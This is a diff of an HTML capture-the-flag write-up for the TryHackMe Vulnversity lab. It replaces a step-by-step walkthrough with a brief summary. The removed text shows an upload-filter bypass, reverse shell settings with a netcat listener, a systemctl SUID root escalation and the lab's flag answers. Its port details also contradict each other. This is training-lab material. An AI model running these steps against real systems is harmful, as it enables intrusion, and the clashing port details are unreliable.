@@ -37,177 +37,112 @@
         <a href="../index.html#labs" class="back-btn">&lt;-- Back to Labs</a>
         
         <div class="header">
-            <h1>TryHackMe: Vulnversity Writeup</h1>
+            <h1>🛡️ THM Writeup – Vulnversity</h1>
             <div class="meta">
-                <span>Target IP: <code>10.10.161.189</code></span>
+                <span>Platform: TryHackMe</span>
                 <span>Difficulty: Easy</span>
-                <span>Author: Mohd Faiz</span>
+                <span>Focus: Enumeration, Web Exploitation, Privilege Escalation</span>
             </div>
             <div>
                 <span class="tag">Enumeration</span>
-                <span class="tag">Nmap</span>
-                <span class="tag">Gobuster</span>
-                <span class="tag">Burp Suite</span>
+                <span class="tag">Directory Bruteforce</span>
+                <span class="tag">File Upload Bypass</span>
+                <span class="tag">Reverse Shell</span>
                 <span class="tag">SUID Escalation</span>
             </div>
         </div>
 
-        <!-- Task 1 -->
         <div class="task-box">
             <div class="task-header">
-                <span>Task 1: Deploy the machine</span>
-                <span style="color:#8b949e;">[Completed]</span>
-            </div>
-            <div class="task-body">
-                <p>Connect to the TryHackMe OpenVPN network or use the AttackBox, then deploy the target machine.</p>
-            </div>
-        </div>
-
-        <!-- Task 2 -->
-        <div class="task-box">
-            <div class="task-header">
-                <span>Task 2: Reconnaissance</span>
+                <span>🔍 1. Enumeration</span>
                 <span style="color:#8b949e;">[Nmap Scan]</span>
             </div>
             <div class="task-body">
-                <p>Gather information about the target using Nmap to scan open ports and services.</p>
-                <pre><code>nmap -sC -sV -oN nmap_scan.txt 10.10.161.189</code></pre>
+                <h3>Nmap Scan</h3>
+                <pre><code>nmap -F -sV -v &lt;IP&gt; -p 3333</code></pre>
                 
-                <h3>Scan Results:</h3>
-                <pre><code>PORT     STATE SERVICE     VERSION
-22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
-21/tcp   open  ftp         vsftpd 3.0.3
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
-445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
-31337/tcp open http        Apache httpd 2.4.18 ((Ubuntu))
-3306/tcp open  mysql       MySQL (unauthorized)</code></pre>
-
-                <h3>Questions & Answers:</h3>
+                <h3>Open Ports Identified</h3>
                 <ul>
-                    <li><strong>Scan the box, how many ports are open?</strong> -> <code>6</code></li>
-                    <li><strong>What version of the squid proxy is running on the machine?</strong> -> <code>3.5.12</code> (or run `nmap -sV -p 31337` to confirm HTTP server details).</li>
-                    <li><strong>How many ports will nmap scan if the flag -p-400 was used?</strong> -> <code>400</code></li>
-                    <li><strong>What is the OS most likely running on?</strong> -> <code>Ubuntu</code></li>
-                    <li><strong>What port is the web server running on?</strong> -> <code>31337</code></li>
+                    <li><code>21</code> (FTP)</li>
+                    <li><code>22</code> (SSH)</li>
+                    <li><code>139</code> (SMB)</li>
+                    <li><code>445</code> (SMB)</li>
+                    <li><code>3128</code> (Proxy)</li>
+                    <li><code>3333</code> (HTTP)</li>
+                </ul>
+
+                <h3>Key Finding</h3>
+                <p>Web server running on port <code>3333</code>.</p>
+            </div>
+        </div>
+
+        <div class="task-box">
+            <div class="task-header">
+                <span>🌐 2. Directory Brute Forcing & Exploitation</span>
+                <span style="color:#8b949e;">[Gobuster & Bypass]</span>
+            </div>
+            <div class="task-body">
+                <h3>Tool Used</h3>
+                <p>Gobuster</p>
+
+                <h3>Discovered Directories</h3>
+                <ul>
+                    <li><code>/css</code></li>
+                    <li><code>/fonts</code></li>
+                    <li><code>/images</code></li>
+                    <li><code>/internal</code></li>
+                    <li><code>/js</code></li>
+                </ul>
+
+                <h3>Target</h3>
+                <p><code>/internal/</code> → File upload functionality identified.</p>
+
+                <h3>⚡ Bypassing Upload Restrictions</h3>
+                <p>The standard <code>.php</code> extension was blocked. Tested alternatives:</p>
+                <ul>
+                    <li><code>.php3</code></li>
+                    <li><code>.php4</code></li>
+                    <li><code>.php5</code></li>
+                    <li><code>.phtml</code> ✅</li>
+                </ul>
+
+                <h3>Exploitation</h3>
+                <ul>
+                    <li>Uploaded reverse shell using the <code>.phtml</code> extension.</li>
+                    <li>Successfully gained shell access.</li>
                 </ul>
             </div>
         </div>
 
-        <!-- Task 3 -->
         <div class="task-box">
             <div class="task-header">
-                <span>Task 3: Locating directories using GoBuster</span>
-                <span style="color:#8b949e;">[Web Directory Bruteforce]</span>
+                <span>🔐 3. Privilege Escalation</span>
+                <span style="color:#8b949e;">[SUID & GTFOBins]</span>
             </div>
             <div class="task-body">
-                <p>Using <code>gobuster</code> to discover hidden directories hosted on port 31337:</p>
-                <pre><code>gobuster dir -u http://10.10.161.189:31337/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
+                <h3>Finding SUID Binaries</h3>
+                <pre><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></pre>
 
-                <h3>Gobuster Output:</h3>
-                <pre><code>/images               (Status: 301)
-/css                  (Status: 301)
-/js                   (Status: 301)
-/internal             (Status: 301)
-/fonts                (Status: 301)</code></pre>
+                <h3>Vulnerable Binary</h3>
+                <pre><code>/bin/systemctl</code></pre>
 
-                <p>Navigating to <code>http://10.10.161.189:31337/internal/</code> reveals an explicit web upload form!</p>
-
-                <h3>Questions & Answers:</h3>
+                <h3>Exploitation Method</h3>
                 <ul>
-                    <li><strong>What is the directory that has an upload form page?</strong> -> <code>/internal/</code></li>
+                    <li>Referenced GTFOBins for systemctl escalation techniques.</li>
+                    <li>Used <code>systemctl</code> to escalate privileges to root.</li>
                 </ul>
-            </div>
-        </div>
-
-        <!-- Task 4 -->
-        <div class="task-box">
-            <div class="task-header">
-                <span>Task 4: Compromise the webserver</span>
-                <span style="color:#8b949e;">[File Upload Extension Bypass]</span>
-            </div>
-            <div class="task-body">
-                <p>The upload page blocks standard <code>.php</code> files. We can use Burp Suite Intruder to fuzz extension types.</p>
-
-                <h3>Step-by-Step Fuzzing with Burp Suite:</h3>
-                <ol>
-                    <li>Create a wordlist file named <code>phpext.txt</code> containing:
-                        <pre><code>.php
-.php3
-.php4
-.php5
-.phtml</code></pre>
-                    </li>
-                    <li>Intercept a file upload request using Burp Suite and send it to <strong>Intruder</strong>.</li>
-                    <li>Position the payload marker on the file extension: <code>filename="shell§.php§"</code>.</li>
-                    <li>Load <code>phpext.txt</code> as the payload list and uncheck payload encoding.</li>
-                    <li>Start the attack! Notice that <code>.phtml</code> returns a different response length and status code, confirming it is permitted!</li>
-                </ol>
-
-                <h3>Exploitation (Gaining Shell):</h3>
-                <p>1. Download the PentestMonkey PHP Reverse Shell script and edit the configuration settings:</p>
-                <pre><code>$ip = '10.11.x.x';  // Your THM tun0 IP
-$port = 1234;       // Listening port</code></pre>
-
-                <p>2. Rename the payload file to <code>revshell.phtml</code> and upload it via <code>http://10.10.161.189:31337/internal/</code>.</p>
-                <p>3. Set up a Netcat listener on your machine:</p>
-                <pre><code>nc -lvnp 1234</code></pre>
-                <p>4. Execute the payload by visiting <code>http://10.10.161.189:31337/internal/uploads/revshell.phtml</code>.</p>
 
                 <div class="flag-box">
-                    User Flag (cat /home/bill/user.txt): 8837015091ab16b3228d3080d08d69cd
+                    🏁 Final Result: Root shell obtained & retrieved root.txt. Lab successfully completed!
                 </div>
 
-                <h3>Questions & Answers:</h3>
+                <h3>📚 Skills Demonstrated</h3>
                 <ul>
-                    <li><strong>What extension is allowed for upload?</strong> -> <code>.phtml</code></li>
-                    <li><strong>What is the name of the user who manages the webserver?</strong> -> <code>bill</code></li>
-                    <li><strong>What is the user flag?</strong> -> <code>8837015091ab16b3228d3080d08d69cd</code></li>
-                </ul>
-            </div>
-        </div>
-
-        <!-- Task 5 -->
-        <div class="task-box">
-            <div class="task-header">
-                <span>Task 5: Privilege Escalation</span>
-                <span style="color:#8b949e;">[SUID Binary Abuse]</span>
-            </div>
-            <div class="task-body">
-                <p>Now that we have initial access as <code>www-data</code>, search the filesystem for SUID binaries owned by root:</p>
-                <pre><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code></pre>
-
-                <h3>Notable SUID Binaries Found:</h3>
-                <pre><code>/bin/su
-/bin/ping
-/bin/mount
-/bin/systemctl  <-- Unusual SUID binary!</code></pre>
-
-                <h3>Privilege Escalation via systemctl:</h3>
-                <p>Since <code>systemctl</code> has SUID privileges, we can create a custom systemd service file to execute commands as root.</p>
-
-                <p>1. Create a variable containing a malicious unit service file payload:</p>
-                <pre><code>privesc=$(mktemp .service)
-echo '[Service]
-Type=oneshot
-ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/rootflag.txt"
-[Install]
-WantedBy=multi-user.target' > $privesc</code></pre>
-
-                <p>2. Run the unit file using systemctl:</p>
-                <pre><code>/bin/systemctl link $privesc
-/bin/systemctl start $privesc</code></pre>
-
-                <p>3. Read the extracted flag file:</p>
-                <pre><code>cat /tmp/rootflag.txt</code></pre>
-
-                <div class="flag-box">
-                    Root Flag: a58421703e83b27b3e0202e77e2311f9
-                </div>
-
-                <h3>Questions & Answers:</h3>
-                <ul>
-                    <li><strong>On the system, search for all SUID files. Which file stands out?</strong> -> <code>/bin/systemctl</code></li>
-                    <li><strong>What is the root flag?</strong> -> <code>a58421703e83b27b3e0202e77e2311f9</code></li>
+                    <li>Network Enumeration</li>
+                    <li>Directory Bruteforcing</li>
+                    <li>File Upload Bypass</li>
+                    <li>Reverse Shell Execution</li>
+                    <li>Privilege Escalation (SUID + GTFOBins)</li>
                 </ul>
             </div>
         </div>
